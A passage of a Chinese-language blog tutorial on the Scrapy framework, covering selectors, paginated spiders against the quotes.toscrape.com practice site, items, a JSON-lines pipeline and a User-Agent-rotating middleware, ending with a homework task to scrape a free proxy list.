    &lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"tag"</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"/tag/change/page/1/"</span>&gt;change&lt;/<span style="color: #0000ff;">a</span>&gt;
    &lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"tag"</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"/tag/deep-thoughts/page/1/"</span>&gt;deep-thoughts&lt;/<span style="color: #0000ff;">a</span>&gt;
    &lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"tag"</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"/tag/thinking/page/1/"</span>&gt;thinking&lt;/<span style="color: #0000ff;">a</span>&gt;
    &lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"tag"</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"/tag/world/page/1/"</span>&gt;world&lt;/<span style="color: #0000ff;">a</span>&gt;
  &lt;/<span style="color: #0000ff;">div</span>&gt;
&lt;/<span style="color: #0000ff;">div</span>&gt;
</pre>
</div>

<p>
运行命令 <code>$ scrapy shell 'https://quotes.toscrape.com'</code><br>
</p>

<p>
如果要获取 <code>&lt;div class="quote"&gt;</code> 中的内容，可以这样写：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; quote = response.css(<span style="color: #8b2252;">"div.quote"</span>)[0]
&gt;&gt;&gt; text = quote.css(<span style="color: #8b2252;">"span.text::text"</span>).get()
&gt;&gt;&gt; text
<span style="color: #8b2252;">'&#8220;The world as we have created it is a process of our thinking. It cannot be changed</span>
<span style="color: #8b2252;">without changing our thinking.&#8221;'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;div&#26631;&#31614;class&#20026;tag&#20013;a&#26631;&#31614;class&#20026;tag&#30340;text</span>
&gt;&gt;&gt; tags = quote.css(<span style="color: #8b2252;">"div.tags a.tag::text"</span>).getall()
&gt;&gt;&gt; tags
[<span style="color: #8b2252;">'change'</span>, <span style="color: #8b2252;">'deep-thoughts'</span>, <span style="color: #8b2252;">'thinking'</span>, <span style="color: #8b2252;">'world'</span>]

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462; a &#26631;&#31614;&#30340; href &#23646;&#24615;&#20540;</span>
&gt;&gt;&gt; quote.css(<span style="color: #8b2252;">"div.tags a::attr(href)"</span>).getall()
[<span style="color: #8b2252;">'/tag/change/page/1/'</span>, <span style="color: #8b2252;">'/tag/deep-thoughts/page/1/'</span>, <span style="color: #8b2252;">'/tag/thinking/page/1/'</span>,<span style="color: #8b2252;">'/tag/world/page/1/'</span>]
</pre>
</div>

<p>
<b>在python代码中获取解析返回数据</b><br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> scrapy

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciSpider</span>(scrapy.Spider):
    <span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"Cici2"</span>

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">start_requests</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a0522d;">urls</span> = [
            <span style="color: #8b2252;">'https://quotes.toscrape.com/page/1/'</span>,
            <span style="color: #8b2252;">'https://quotes.toscrape.com/page/2/'</span>,
        ]
        <span style="color: #a020f0;">for</span> url <span style="color: #a020f0;">in</span> urls:
            <span style="color: #a020f0;">yield</span> scrapy.Request(url=url, callback=<span style="color: #a020f0;">self</span>.parse)

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">parse</span>(<span style="color: #a020f0;">self</span>, response):
        <span style="color: #a020f0;">for</span> quote <span style="color: #a020f0;">in</span> response.css(<span style="color: #8b2252;">'div.quote'</span>):
            <span style="color: #a020f0;">yield</span> {
                <span style="color: #8b2252;">'text'</span>: quote.css(<span style="color: #8b2252;">'span.text::text'</span>).get(),
                <span style="color: #8b2252;">'author'</span>: quote.css(<span style="color: #8b2252;">'small.author::text'</span>).get(),
                <span style="color: #8b2252;">'tags'</span>: quote.css(<span style="color: #8b2252;">'div.tags a.tag::text'</span>).getall(),
            }
</pre>
</div>

<p>
运行： <code>scrapy crawl Cici2</code><br>
</p>

<p>
存储数据：<br>
</p>
<ul class="org-ul">
<li>scrapy crawl Cici2 -O quotes.json json列表形式 (所有json存储在一个列表中)<br></li>
<li>scrapy crawl Cici2 -O quotes.jl json lines 格式 (一行一条json数据)<br></li>
</ul>

<p>
<b>提取下一页内容</b><br>
</p>

<p>
通过HTML看到下一页的标签<br>
</p>
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">ul</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"pager"</span>&gt;
  &lt;<span style="color: #0000ff;">li</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"next"</span>&gt;
    &lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"/page/2/"</span>&gt;Next &lt;<span style="color: #0000ff;">span</span> <span style="color: #a0522d;">aria-hidden</span>=<span style="color: #8b2252;">"true"</span>&gt;<span style="color: #a0522d;">&amp;rarr;</span>&lt;/<span style="color: #0000ff;">span</span>&gt;&lt;/<span style="color: #0000ff;">a</span>&gt;
  &lt;/<span style="color: #0000ff;">li</span>&gt;
&lt;/<span style="color: #0000ff;">ul</span>&gt;
</pre>
</div>

<p>
获取标签链接：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt;&gt;&gt; response.css(<span style="color: #8b2252;">'li.next a::attr(href)'</span>).get()
<span style="color: #8b2252;">'/page/2/'</span>
</pre>
</div>

<p>
使用爬虫代码解析<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> scrapy

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciSpider</span>(scrapy.Spider):
    <span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"CiciSecond"</span>
    <span style="color: #a0522d;">start_urls</span> = [
        <span style="color: #8b2252;">'https://quotes.toscrape.com/page/1/'</span>,
    ]
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">parse</span>(<span style="color: #a020f0;">self</span>, response):
        <span style="color: #a020f0;">for</span> quote <span style="color: #a020f0;">in</span> response.css(<span style="color: #8b2252;">'div.quote'</span>):
            <span style="color: #a020f0;">yield</span> {
                <span style="color: #8b2252;">'text'</span>: quote.css(<span style="color: #8b2252;">'span.text::text'</span>).get(),
                <span style="color: #8b2252;">'author'</span>: quote.css(<span style="color: #8b2252;">'small.author::text'</span>).get(),
                <span style="color: #8b2252;">'tags'</span>: quote.css(<span style="color: #8b2252;">'div.tags a.tag::text'</span>).getall(),
            }
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#19979;&#19968;&#39029;&#38142;&#25509;</span>
        <span style="color: #a0522d;">next_page</span> = response.css(<span style="color: #8b2252;">'li.next a::attr(href)'</span>).get()
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#38142;&#25509;&#19981;&#26159;&#31354;</span>
        <span style="color: #a020f0;">if</span> next_page <span style="color: #a020f0;">is</span> <span style="color: #a020f0;">not</span> <span style="color: #008b8b;">None</span>:
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25509;&#25910;&#19979;&#19968;&#39029;&#36820;&#22238;&#20869;&#23481;</span>
            <span style="color: #a0522d;">next_page</span> = response.urljoin(next_page)
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32487;&#32493;&#35843;&#29992; Scrapy &#35831;&#27714;&#65292;&#24182;&#22238;&#35843; parse &#20989;&#25968;</span>
            <span style="color: #a020f0;">yield</span> scrapy.Request(next_page, callback=<span style="color: #a020f0;">self</span>.parse)
</pre>
</div>

<p>
更简便的方法是使用 response.follow<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> scrapy

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciSpider</span>(scrapy.Spider):
    <span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"CiciSecond"</span>
    <span style="color: #a0522d;">start_urls</span> = [
        <span style="color: #8b2252;">'https://quotes.toscrape.com/page/1/'</span>,
    ]
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">parse</span>(<span style="color: #a020f0;">self</span>, response):
        <span style="color: #a020f0;">for</span> quote <span style="color: #a020f0;">in</span> response.css(<span style="color: #8b2252;">'div.quote'</span>):
            <span style="color: #a020f0;">yield</span> {
                <span style="color: #8b2252;">'text'</span>: quote.css(<span style="color: #8b2252;">'span.text::text'</span>).get(),
                <span style="color: #8b2252;">'author'</span>: quote.css(<span style="color: #8b2252;">'small.author::text'</span>).get(),
                <span style="color: #8b2252;">'tags'</span>: quote.css(<span style="color: #8b2252;">'div.tags a.tag::text'</span>).getall(),
            }
            <span style="color: #b22222;"># </span><span style="color: #b22222;">========================================================================</span>
        <span style="color: #a0522d;">next_page</span> = response.css(<span style="color: #8b2252;">'li.next a::attr(href)'</span>).get()
        <span style="color: #a020f0;">if</span> next_page <span style="color: #a020f0;">is</span> <span style="color: #a020f0;">not</span> <span style="color: #008b8b;">None</span>:
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30452;&#25509;&#20351;&#29992; response.follow &#21363;&#21487;</span>
            <span style="color: #a020f0;">yield</span> response.follow(next_page, callback=<span style="color: #a020f0;">self</span>.parse)

        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24403;&#38656;&#35201;&#33719;&#21462; a &#26631;&#31614;&#30340; href &#23646;&#24615;&#26102;&#65292;&#25903;&#25345;&#33258;&#21160;&#33719;&#21462;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">========================================================================</span>
        <span style="color: #a020f0;">for</span> a <span style="color: #a020f0;">in</span> response.css(<span style="color: #8b2252;">'ul.pager a'</span>):
            <span style="color: #a020f0;">yield</span> response.follow(a, callback=<span style="color: #a020f0;">self</span>.parse)

        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36827;&#19968;&#27493;&#32553;&#30701;, &#20351;&#29992; follow_all &#26041;&#27861;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">========================================================================</span>
        <span style="color: #a020f0;">yield</span> <span style="color: #a020f0;">from</span> response.follow_all(css=<span style="color: #8b2252;">'ul.pager a'</span>, callback=<span style="color: #a020f0;">self</span>.parse)
</pre>
</div>

<p>
使用参数<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">scrapy crawl CiciSecond2 -O quotes-humor.json -a <span style="color: #a0522d;">tag</span>=humor
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> scrapy

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciSpider</span>(scrapy.Spider):
    <span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"CiciSecond2"</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">start_requests</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a0522d;">url</span> = <span style="color: #8b2252;">'https://quotes.toscrape.com/'</span>
        <span style="color: #a0522d;">tag</span> = <span style="color: #483d8b;">getattr</span>(<span style="color: #a020f0;">self</span>, <span style="color: #8b2252;">'tag'</span>, <span style="color: #008b8b;">None</span>)
        <span style="color: #a020f0;">if</span> tag <span style="color: #a020f0;">is</span> <span style="color: #a020f0;">not</span> <span style="color: #008b8b;">None</span>:
            <span style="color: #a0522d;">url</span> = url + <span style="color: #8b2252;">'tag/'</span> + tag
        <span style="color: #a020f0;">yield</span> scrapy.Request(url, <span style="color: #a020f0;">self</span>.parse)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">parse</span>(<span style="color: #a020f0;">self</span>, response):
    <span style="color: #a020f0;">for</span> quote <span style="color: #a020f0;">in</span> response.css(<span style="color: #8b2252;">'div.quote'</span>):
        <span style="color: #a020f0;">yield</span> {
            <span style="color: #8b2252;">'text'</span>: quote.css(<span style="color: #8b2252;">'span.text::text'</span>).get(),
            <span style="color: #8b2252;">'author'</span>: quote.css(<span style="color: #8b2252;">'small.author::text'</span>).get(),
        }

    <span style="color: #a0522d;">next_page</span> = response.css(<span style="color: #8b2252;">'li.next a::attr(href)'</span>).get()
    <span style="color: #a020f0;">if</span> next_page <span style="color: #a020f0;">is</span> <span style="color: #a020f0;">not</span> <span style="color: #008b8b;">None</span>:
        <span style="color: #a020f0;">yield</span> response.follow(next_page, <span style="color: #a020f0;">self</span>.parse)
</pre>
</div>

<p>
<b>使用item</b><br>
</p>

<p>
首先，在items.py 文件中定义item<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">Define here the models for your scraped items</span>
<span style="color: #b22222;">#</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">See documentation in:</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">https://docs.scrapy.org/en/latest/topics/items.html</span>
<span style="color: #a020f0;">import</span> scrapy
<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciScrapyDemoItem</span>(scrapy.Item):
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#23383;&#27573;</span>
    <span style="color: #a0522d;">text</span> = scrapy.Field()
    <span style="color: #a0522d;">author</span> = scrapy.Field()
    <span style="color: #a0522d;">tags</span> = scrapy.Field()
    <span style="color: #a0522d;">last_updated</span> = scrapy.Field(serializer=<span style="color: #483d8b;">str</span>)
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> scrapy
<span style="color: #a020f0;">from</span> Cici_scrapy_demo.items <span style="color: #a020f0;">import</span> CiciScrapyDemoItem

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciSpider</span>(scrapy.Spider):
    <span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"CicItemTest"</span>
    <span style="color: #a0522d;">start_urls</span> = [
        <span style="color: #8b2252;">'https://quotes.toscrape.com/page/1/'</span>,
    ]
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">parse</span>(<span style="color: #a020f0;">self</span>, response):
        <span style="color: #a020f0;">for</span> quote <span style="color: #a020f0;">in</span> response.css(<span style="color: #8b2252;">'div.quote'</span>):
            <span style="color: #a0522d;">item</span> = CiciScrapyDemoItem()
            <span style="color: #a0522d;">item</span>[<span style="color: #8b2252;">'text'</span>] = quote.css(<span style="color: #8b2252;">'span.text::text'</span>).get()
            <span style="color: #a0522d;">item</span>[<span style="color: #8b2252;">'author'</span>] = quote.css(<span style="color: #8b2252;">'small.author::text'</span>).get()
            <span style="color: #a0522d;">item</span>[<span style="color: #8b2252;">'tags'</span>] = quote.css(<span style="color: #8b2252;">'div.tags a.tag::text'</span>).getall()
            <span style="color: #a020f0;">yield</span> item
</pre>
</div>

<p>
<b>使用 Item Pipeline</b><br>
</p>

<p>
一个项目被爬虫抓取后，它被发送到 Item Pipeline 它通过按顺序执行的几个组件来处理。<br>
</p>

<p>
每个 Item Pipeline 组件是一个 实现简单方法的 Python 类。<br>
</p>

<p>
Item Pipeline 的典型用途是：<br>
</p>
<ul class="org-ul">
<li>清理 HTML 数据<br></li>
<li>验证抓取的数据（检查项目是否包含某些字段）<br></li>
<li>检查重复项（并删除它们）<br></li>
<li>将抓取的项目存储在数据库中<br></li>
</ul>

<p>
在 pipelines.py 文件中写入，用来将爬取到的数据保存到 items.jl 文件中：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> json

<span style="color: #b22222;"># </span><span style="color: #b22222;">Define your item pipelines here</span>
<span style="color: #b22222;">#</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">Don't forget to add your pipeline to the ITEM_PIPELINES setting</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">useful for handling different item types with a single interface</span>
<span style="color: #a020f0;">from</span> itemadapter <span style="color: #a020f0;">import</span> ItemAdapter

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciScrapyDemoPipeline</span>:
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29228;&#34411;&#24320;&#21551;&#26102;&#33258;&#21160;&#35843;&#29992;&#27492;&#26041;&#27861;</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">open_spider</span>(<span style="color: #a020f0;">self</span>, spider):
        <span style="color: #a020f0;">self</span>.<span style="color: #483d8b;">file</span> = <span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">'items.jl'</span>, <span style="color: #8b2252;">'w'</span>)

    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29228;&#34411;&#20851;&#38381;&#26102;&#33258;&#21160;&#35843;&#29992;&#27492;&#26041;&#27861;</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">close_spider</span>(<span style="color: #a020f0;">self</span>, spider):
        <span style="color: #a020f0;">self</span>.<span style="color: #483d8b;">file</span>.close()
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">process_item</span>(<span style="color: #a020f0;">self</span>, item, spider):
        <span style="color: #a0522d;">line</span> = json.dumps(ItemAdapter(item).asdict()) + <span style="color: #8b2252;">"</span><span style="color: #008b8b;">\n</span><span style="color: #8b2252;">"</span>
        <span style="color: #a020f0;">self</span>.<span style="color: #483d8b;">file</span>.write(line)
        <span style="color: #a020f0;">return</span> item
</pre>
</div>

<p>
在 settings.py 文件中将以下代码注释取消：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">ITEM_PIPELINES</span> = {
    <span style="color: #b22222;"># </span><span style="color: #b22222;">pipelines &#20013;&#31867;&#30340;&#21517;&#31216;&#65292;&#21487;&#20197;&#21152;&#20837;&#22810;&#20010;</span>
    <span style="color: #8b2252;">'Cici_scrapy_demo.pipelines.CiciScrapyDemoPipeline'</span>: 300,
}
</pre>
</div>

<p>
<b>使用中间件</b><br>
</p>

<ul class="org-ul">
<li>process_spider_input(response, spider)<br>
<ul class="org-ul">
<li>对于通过 spider 的每个响应都会调用此方法 中间件并进入 spider，进行处理。<br>
<ul class="org-ul">
<li>process_spider_input()应该返回 None<br></li>
<li>如果它返回 None , Scrapy 会继续处理这个响应， 执行所有其他中间件，直到最终收到响应 交给spider处理<br></li>
</ul></li>
</ul></li>
<li>process_spider_output(response, result, spider)<br>
<ul class="org-ul">
<li>使用从 Spider 返回的结果调用此方法，之后 它已经处理了响应。<br>
<ul class="org-ul">
<li>必须返回一个 result 的可迭代对象<br></li>
</ul></li>
</ul></li>
<li>process_start_requests(start_requests, spider)<br>
<ul class="org-ul">
<li>这个方法是在spider的启动请求中调用的，必须只返回requests<br></li>
</ul></li>
</ul>

<p>
示例<br>
在middlewares.py 中写入中间件代码<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> random

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33258;&#21160;&#26367;&#25442;UA</span>
<span style="color: #a020f0;">class</span> <span style="color: #228b22;">UAMiddleware</span>(<span style="color: #483d8b;">object</span>):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__init__</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">self</span>.<span style="color: #a0522d;">USER_AGENT_LIST</span> = [
            <span style="color: #8b2252;">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"</span>,
            <span style="color: #8b2252;">"Dalvik/1.6.0 (Linux; U; Android 4.2.1; 2013022 MIUI/JHACNBL30.0)"</span>,
            <span style="color: #8b2252;">"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"</span>,
            <span style="color: #8b2252;">"AndroidDownloadManager"</span>,
            <span style="color: #8b2252;">"Apache-HttpClient/UNAVAILABLE (java 1.4)"</span>,
            <span style="color: #8b2252;">"Dalvik/1.6.0 (Linux; U; Android 4.3; SM-N7508V Build/JLS36C)"</span>,
            <span style="color: #8b2252;">"Android50-AndroidPhone-8000-76-0-Statistics-wifi"</span>,
            <span style="color: #8b2252;">"Dalvik/1.6.0 (Linux; U; Android 4.4.4; MI 3 MIUI/V7.2.1.0.KXCCNDA)"</span>,
            <span style="color: #8b2252;">"Dalvik/1.6.0 (Linux; U; Android 4.4.2; Lenovo A3800-d Build/LenovoA3800-d)"</span>,
            <span style="color: #8b2252;">"Lite 1.0 ( http://litesuits.com )"</span>,
            <span style="color: #8b2252;">"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)"</span>,
            <span style="color: #8b2252;">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0"</span>,
            <span style="color: #8b2252;">"Mozilla/5.0 (Linux; U; Android 4.1.1; zh-cn; HTC T528t Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypay,securityinstalled); 360(android,uppayplugin); 360 Aphone Browser (2.0.4)"</span>,
        ]

    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992; process_spider_input &#26041;&#27861;</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">process_spider_input</span>(<span style="color: #a020f0;">self</span>, response, spider):
        <span style="color: #a0522d;">ua</span> = random.choice(<span style="color: #a020f0;">self</span>.USER_AGENT_LIST)
        response.request.<span style="color: #a0522d;">headers</span>[<span style="color: #8b2252;">'User-Agent'</span>] = ua
        <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">None</span>
</pre>
</div>

<p>
在settings.py 中激活中间件<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">SPIDER_MIDDLEWARES</span> = {
    <span style="color: #8b2252;">'Cici_scrapy_demo.middlewares.UAMiddleware'</span>: 544,
}
</pre>
</div>

<p>
在spider中输出请求的UA信息<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> scrapy
<span style="color: #a020f0;">from</span> Cici_scrapy_demo.items <span style="color: #a020f0;">import</span> CiciScrapyDemoItem

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">CiciSpider</span>(scrapy.Spider):
    <span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"CicItemTest"</span>
    <span style="color: #a0522d;">start_urls</span> = [
        <span style="color: #8b2252;">'https://quotes.toscrape.com/page/1/'</span>,
    ]
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">parse</span>(<span style="color: #a020f0;">self</span>, response):
        <span style="color: #a020f0;">for</span> quote <span style="color: #a020f0;">in</span> response.css(<span style="color: #8b2252;">'div.quote'</span>):
            ..............
            <span style="color: #483d8b;">print</span>(response.request.headers[<span style="color: #8b2252;">'User-Agent'</span>])
            <span style="color: #a020f0;">yield</span> item
</pre>
</div>

<p>
作业：<br>
</p>
<ol class="org-ol">
<li>爬取代理网站 <a href="https://free.kuaidaili.com">https://free.kuaidaili.com</a><br></li>
<li>使用item设置类，其中包含 IP、PORT、类型、位置、响应速度、最后验证时间<br></li>
<li>爬取内容写入文件，按最后验证时间倒序排列<br></li>
<li>设置爬虫参数：<br>
<ol class="org-ol">
<li>设置地理位置，例如：根据参数设置位置为 香港，则只爬取香港的代理地址<br></li>
<li>设置响应时间，例如：设置响应时间为 0.3秒，则爬取响应速度小于等于0.3秒的代理IP地址<br></li>
</ol></li>
</ol>
</div>
</div>
</div>
</section>
</div>
<div id="postamble" class="status">
    <div class=bar data-astro-cid-p3givckg>
        <div class=list data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
                    <title>emacs</title>
                    <symbol id=ai:simple-icons:gnuemacs>
                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Emacs</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
                    <title>org-mode</title>
                    <symbol id=ai:simple-icons:org>
                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:org></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Orgmode</p>
                </div>
            </span>
            <a href=/donations.html class=entry data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
                    <title>Donations</title>
                    <symbol id=ai:simple-icons:astro>
                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:simple-icons:astro></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>打赏</p>
                </div>
            </span>
            </a>
            <span class=entry data-astro-cid-p3givckg>
